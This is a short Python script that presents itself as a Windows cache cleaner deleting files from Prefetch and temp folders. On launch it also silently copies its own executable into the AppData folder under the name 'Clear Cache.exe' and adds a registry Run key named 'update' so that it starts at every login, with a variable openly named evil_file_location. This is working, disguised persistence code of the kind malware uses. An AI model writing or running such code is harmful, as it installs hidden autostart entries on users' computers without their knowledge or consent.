import os
from typing import List
import shutil
import subprocess
import sys
from colorama import Fore, init, Style # type: ignore


class ClearCache(object):
   def __init__(self, /) -> None:
      init(autoreset=True)
      self.become_persistent()
      path_list: List = ["C:\\Windows\\Prefetch", "C:\\Windows\\Temp", os.getenv('temp')]
      for path in path_list:
         self.clear_data(path)
      
   
   def clear_data(self, locate: str, /) -> None:
      for path, _, files in os.walk(locate):
         for file in files:
            try:
               os.remove(os.path.join(path, file))
               print(f"{Fore.GREEN} [+] SUCCESS: {os.path.join(path, file)}")
            except:
               print(f"{Fore.RED} [-] ERROR: {os.path.join(path, file)}")


   def become_persistent(self, /) -> None:
      evil_file_location = os.environ["appdata"] + "\\Clear Cache.exe"
      if not os.path.exists(evil_file_location):
         shutil.copyfile(sys.executable, evil_file_location)
         subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{evil_file_location}"', shell=True)


if __name__ == "__main__":
   clear_cache = ClearCache()